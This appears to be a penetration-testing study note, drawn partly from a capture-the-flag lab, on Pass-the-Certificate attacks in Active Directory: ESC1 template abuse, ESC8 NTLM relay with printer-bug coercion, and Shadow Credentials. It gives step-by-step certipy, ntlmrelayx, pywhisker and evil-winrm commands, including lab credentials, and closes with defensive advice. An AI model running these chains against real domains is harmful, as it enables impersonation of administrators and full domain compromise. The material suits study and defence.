
## Overview

**Pass the Certificate** is an authentication abuse technique where an attacker uses an **X.509 certificate** instead of a plaintext password or NTLM hash to obtain Kerberos access.

In practice, this usually means:

- obtaining a certificate and private key for a target identity
- using that certificate to request a **Kerberos TGT**
- then reusing the resulting Kerberos ticket for lateral movement or privilege escalation

Most commonly associated with:

- **Active Directory Certificate Services (AD CS) abuse**
- **Shadow Credentials attacks**
- **PKINIT-enabled Kerberos environments**

> [!tip] Mental Model
> 
> - **Pass the Hash** = log in with the password hash
> - **Pass the Ticket** = log in with the Kerberos ticket
> - **Pass the Certificate** = log in with the certificate to _get_ the Kerberos ticket

---

# PKINIT Refresher

**PKINIT** = Public Key Cryptography for Initial Authentication in Kerberos.

Normally Kerberos initial auth is password-based. With PKINIT, a client authenticates using a **certificate + its private key** instead — used for smart card logon, certificate-based user auth, and certificate-based machine auth.

If an attacker gains a certificate and private key that AD accepts for authentication, they can request a valid **TGT** as that user or machine — without ever knowing the password.

---

# Why This Matters

Successfully authenticating with a certificate can let you:

- request a TGT without the victim's password
- impersonate user or machine accounts
- move into **Pass the Ticket** territory
- access WinRM, SMB, LDAP, or other Kerberos-backed services
- escalate further, including to **DCSync** in the right scenarios

# Certificate Template Vulnerabilities — ESC1 (Practical, from Escape box)

## Concept

A certificate template is vulnerable to **ESC1** when a low-privileged, authenticated user can:

1. **Enroll** in the template at all, and
2. **Supply their own Subject Alternative Name (SAN)** on the certificate request — flagged by `msPKI-Certificate-Name-Flag` containing `ENROLLEE_SUPPLIES_OBJECT`.

If both conditions hold, any enrolled user can request a certificate claiming to be **any other account** — including Domain Admins — and AD will trust it.

> [!warning] Why This Is So Dangerous ESC1 doesn't require any special privilege, write access, or coercion — just the ability to enroll (often granted to `Authenticated Users` by default on a misconfigured template) and a template that lets you name whoever you want as the subject.

## Step 1 — Enumerate CAs and find vulnerable templates

**Using Certify (Windows, requires .NET — build from source via Visual Studio if no release binary exists):**

```powershell
# Upload the binary (e.g. via evil-winrm)
upload Certify.exe

# Confirm a Certificate Authority is present
.\Certify.exe cas

# Enumerate templates for known misconfigurations (ESC1 and others)
.\Certify.exe find /vulnerable
```

Look for output showing:

- Template name (e.g. `UserAuthentication`)
- `Enrollment Rights`: includes a broad group like `Authenticated Users` or `Domain Users`
- `msPKI-Certificate-Name-Flag`: contains `ENROLLEE_SUPPLIES_OBJECT`

**Using Certipy (Linux — often more convenient, no need to build/transfer a Windows binary):**

```bash
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable
```

Certipy's `-vulnerable` flag filters directly to ESC-classified misconfigurations and labels them (`ESC1`, `ESC8`, etc.) in its output — generally faster to read than Certify's raw enumeration.

> [!tip] Certify vs. Certipy Certify runs **on the Windows target** (via a shell you already have) and needs compiling from source if no release exists. Certipy runs **from Kali** directly against the domain and doesn't require any foothold beyond valid domain credentials — if you already have creds and network access to the DC, Certipy is usually the faster path; Certify is more useful once you're already on a box and want to enumerate from an authenticated Windows context.

## Step 2 — Request a certificate as another identity

```bash
certipy-ad req \
  -u <your_user>@<domain> \
  -p '<your_password>' \
  -upn <target_user>@<domain> \
  -target <domain> \
  -ca <ca_name> \
  -template <vulnerable_template_name>
```

**Real example (from Escape / sequel.htb):**

```bash
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

- `-u` / `-p` — your own valid, low-privileged domain credentials (this is what you're actually authenticated as when making the request)
- `-upn` — the identity you're **claiming** on the certificate (this is the actual ESC1 exploitation step — the template lets you set this to anyone)
- `-ca` — CA name, found from the `Certify.exe cas` or `certipy find` output
- `-template` — the specific vulnerable template name

**Output:** a `.pfx` file (e.g. `administrator.pfx`) — a PKCS#12 bundle containing the certificate and matching private key for the claimed identity.

> [!warning] Common Error `The NETBIOS connection with the remote host timed out.` — this is usually transient. Just re-run the same `certipy req` command.

## Step 3 — Use the certificate to get a TGT and NT hash

```bash
certipy-ad auth -pfx <identity>.pfx
```

**Real example:**

```bash
certipy-ad auth -pfx administrator.pfx
```

This performs PKINIT authentication using the certificate, obtains a TGT for the claimed identity, and — critically — also extracts and displays the account's **NT hash** directly from the PKINIT exchange (via the `U2U`/`PAC` mechanism), without needing a separate DCSync step.

> [!note] Kerberos Clock Sync Is Mandatory Before `certipy auth` (or any PKINIT-dependent step), synchronize your clock with the DC:
> 
> ```bash
> sudo ntpdate -u <dc_hostname_or_ip>
> ```
> 
> Kerberos rejects authentication if clock skew exceeds ~5 minutes. This is one of the most common reasons a correctly-executed ESC1 chain appears to fail.

## Step 4 — Use the recovered NT hash

```bash
evil-winrm -i <target> -u <claimed_identity> -H <nt_hash>
```

**Real example:**

```bash
evil-winrm -i sequel.htb -u administrator -H a52f78e...58f4ee
```

This is a straightforward **pass-the-hash**, not PKINIT — once you have the NT hash, the certificate/PKINIT phase is done and you're just authenticating normally.

# 1. AD CS NTLM Relay Attack (ESC8)

## Concept

Abuses **web enrollment** in AD CS. If a CA exposes a web app (commonly `/CertSrv`) that accepts NTLM authentication, an attacker can:

1. Relay an NTLM authentication attempt to the AD CS web enrollment endpoint.
2. Request a certificate on behalf of the relayed identity.
3. Receive a valid certificate + private key for that account.
4. Use it with PKINIT to obtain a TGT.

## Why ESC8 Is Dangerous

If the relayed identity is a high-value machine account — especially a **domain controller** — the resulting certificate can lead directly to Kerberos ticket issuance, directory replication access, **DCSync**, and full domain compromise.

## High-Level Attack Flow

**Step 1 — Relay NTLM to AD CS web enrollment**

```bash
impacket-ntlmrelayx -t http://<ca_server>/certsrv/certfnsh.asp --adcs --template <template_name>
```

**Step 2 — Coerce a target to authenticate** Either wait for inbound authentication passively, or actively trigger it — a common coercion vector is the **printer bug** (requires the spooler service running):

```bash
python3 printerbug.py <domain>/<user>:<password>@<target_ip> <attacker_ip>
```

**Step 3 — Receive the issued certificate** Delivered as a `.pfx` / PKCS#12 bundle (certificate + private key) if the relay succeeds.

**Step 4 — Use the certificate with PKINIT**

```bash
python3 gettgtpkinit.py -cert-pfx <file>.pfx <domain>/<identity> <output>.ccache
```

**Step 5 — Reuse the resulting Kerberos ticket**

```bash
export KRB5CCNAME=<output>.ccache
```

From here it's a standard Pass the Ticket scenario — Kerberos-authenticated tooling, DCSync, service access, etc.

> [!warning] Template Matters The template passed to relay tooling must be enabled, enrollable, and accepted for authentication in that environment. Template enumeration (via Certify/Certipy) matters just as much for ESC8 as for ESC1.

# 2. Shadow Credentials (msDS-KeyCredentialLink)

## Concept

Abuses the AD attribute `msDS-KeyCredentialLink`, which stores public keys usable for PKINIT authentication. If you can **write** to this attribute on a victim account, you can plant your own public key on it and later authenticate as that user with the matching private key.

In BloodHound: represented by the **AddKeyCredentialLink** edge.

## Why It Works

Adding your own key material to a victim's `msDS-KeyCredentialLink` creates a trusted certificate-based auth path for that account — no password reset, no hash cracking. You're adding a new "accepted authenticator."

## High-Level Attack Flow

**Step 1 — Confirm write access** to the victim's `msDS-KeyCredentialLink` (check via BloodHound's `AddKeyCredentialLink` edge or direct ACL enumeration).

**Step 2 — Generate a cert and attach the public key to the victim**

```bash
pywhisker -d <domain> -u <your_user> -p '<password>' --target <victim_user> --action add
```

Outputs a `.pfx` file and a randomly generated PFX password, and creates a new key credential entry on the victim object.

**Step 3 — Use the PFX with PKINIT**

```bash
python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass <generated_password> <domain>/<victim_user> <output>.ccache
```

**Step 4 — Reuse the ticket** (standard Pass the Ticket from here) — Kerberos-authenticated WinRM, SMB, LDAP, lateral movement as the victim.

---

# After Obtaining the TGT: Back to Pass the Ticket

Once a TGT is obtained via certificate, the "certificate" phase is over — from here it's identical to any other Kerberos ticket abuse:

```bash
export KRB5CCNAME=<file>.ccache
klist   # verify principal, validity, available tickets
```

> **Pass the Certificate = a way of getting a Kerberos ticket without needing the password.**

# Tool Reference

## Certify (Windows)

```powershell
.\Certify.exe cas                  # List available CAs
.\Certify.exe find                 # Enumerate all templates
.\Certify.exe find /vulnerable     # Enumerate only ESC-vulnerable templates
```

Requires building from source (Visual Studio) if no release binary is available. Runs from an existing Windows shell/foothold.

## certipy (Linux)

```bash
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable

certipy-ad req -u <user>@<domain> -p '<password>' -upn <target>@<domain> -target <domain> -ca <ca_name> -template <template>

certipy-ad auth -pfx <file>.pfx
```

Runs directly from Kali against the domain — no Windows foothold required, just valid domain credentials and network reachability to the DC.

## impacket-ntlmrelayx

Relays NTLM authentication to a target — in this context, the AD CS HTTP enrollment endpoint (`--adcs` flag), requesting a certificate using a specified template.

## printerbug.py

Coerces a target system into authenticating to an attacker-controlled host — commonly used to trigger machine account authentication for relaying (ESC8).

## PKINITtools / gettgtpkinit.py

```bash
python3 gettgtpkinit.py -cert-pfx <file>.pfx [-pfx-pass <password>] <domain>/<identity> <output>.ccache
```

Requests a TGT using a certificate + private key via PKINIT. Outputs a `.ccache` file and (depending on tooling/workflow) the AS-REP encryption key.

## pywhisker

```bash
pywhisker -d <domain> -u <user> -p '<password>' --target <victim> --action add
```

Generates a certificate and adds key credential material to a victim account for Shadow Credentials attacks. Outputs a PFX bundle.

## Evil-WinRM

Can authenticate via Kerberos once a TGT is obtained (requires correct `/etc/krb5.conf` and DNS/hosts setup), or via pass-the-hash once an NT hash has been recovered (e.g. via `certipy auth`).

## impacket-secretsdump

Useful after obtaining a machine TGT with sufficient replication rights — performs DCSync-style retrieval of domain credential data.

# Typical Attack Chains

## Chain A: ESC8 → certificate → TGT → DCSync

1. Relay coerced NTLM auth to AD CS web enrollment
2. Obtain certificate for machine account
3. Request TGT via PKINIT
4. Export ticket cache
5. Use Kerberos-authenticated tooling
6. Perform DCSync or similar post-auth operations

## Chain B: ESC1 → certificate → NT hash → pass-the-hash (as actually done on Escape)

1. Enumerate templates with Certify/Certipy, find ESC1 misconfiguration
2. `certipy req` — request certificate claiming a privileged UPN
3. `certipy auth` — PKINIT + extract NT hash directly
4. `evil-winrm -H` — pass-the-hash as the claimed identity

## Chain C: Shadow Credentials → victim user → TGT → lateral movement

1. Identify control over `msDS-KeyCredentialLink`
2. Add a key credential to victim user (`pywhisker`)
3. Generate PFX and private key
4. Request TGT via PKINIT
5. Pass the ticket
6. Access systems the victim can access

# Key Indicators to Understand in Output

|Artifact|Meaning|
|---|---|
|`.pfx`|PKCS#12 bundle: certificate + private key. The core artifact of Pass-the-Certificate — treat as highly sensitive.|
|`.ccache`|Kerberos credential cache file. What Kerberos-aware tools use once a TGT is obtained.|
|`KRB5CCNAME`|Environment variable pointing tools at the active ccache. `export KRB5CCNAME=/tmp/user.ccache`|
|`klist`|Verifies which principal a cache belongs to, validity period, available tickets.|
|AS-REP encryption key|Sometimes output by PKINIT tooling; useful for follow-on operations depending on workflow.|

# Requirements / Prerequisites

## ESC1

- A template that's enabled, enrollable by a broad/low-privileged group, and has `ENROLLEE_SUPPLIES_OBJECT` set
- Any valid low-privileged domain credentials to perform the enrollment request

## ESC8

- AD CS web enrollment enabled
- NTLM accepted on that endpoint
- A relay path available
- A coercion path or inbound authentication source
- A suitable certificate template

## Shadow Credentials

- Write access to the victim object's `msDS-KeyCredentialLink`
- PKINIT usable in the environment
- Victim account not blocked from that auth path

# No PKINIT?

Sometimes a certificate is obtained but PKINIT still fails because:

- The KDC doesn't accept the certificate for that account
- The EKU (Extended Key Usage) is insufficient
- The cert isn't usable for Kerberos pre-authentication in that context

In those cases, certificate-authenticated **LDAP over LDAPS** may still work. Tool: **PassTheCert** — useful specifically when the certificate is valid for authentication generally, but not for the PKINIT path expected.

# Operational Considerations

> [!warning] Name Resolution Matters Kerberos is sensitive to hostnames and SPNs. Ensure DNS works, or `/etc/hosts` is populated correctly, before running Kerberos-authenticated tooling.

> [!warning] Kerberos Config Matters If using Linux tooling (e.g. Evil-WinRM with Kerberos), confirm `/etc/krb5.conf` is correct, the realm name matches, and the KDC is resolvable.

> [!warning] Certificates Are Credentials Treat `.pfx` files as highly sensitive — if you have the PFX and password, you effectively have the target identity.

> [!warning] Machine Accounts Are High Value A certificate for a domain controller machine account is more dangerous than one for a normal user, given what that machine can access and do (replication rights, etc.).

---

# Detection / Defensive Relevance

Pass-the-Certificate techniques often bypass detection built around password theft, spraying, and hash dumping — a defender focused on those may miss certificate abuse if AD CS monitoring is weak.

Key defensive themes:

- Lock down AD CS templates (disable `ENROLLEE_SUPPLIES_OBJECT` where not needed, restrict enrollment rights)
- Disable insecure web enrollment exposure
- Require HTTPS where appropriate
- Prevent NTLM relay paths
- Audit `msDS-KeyCredentialLink` changes
- Monitor certificate issuance patterns
- Monitor suspicious PKINIT usage

# Quick Mental Model

- **Password** proves identity the usual way
- **Hash** can substitute for password in some protocols
- **Ticket** can substitute for repeated authentication
- **Certificate** can be used to obtain the ticket in the first place

> **Pass the Certificate = use a certificate to get a TGT (or, via ESC1, an NT hash directly), then continue with Pass the Ticket / pass-the-hash.**
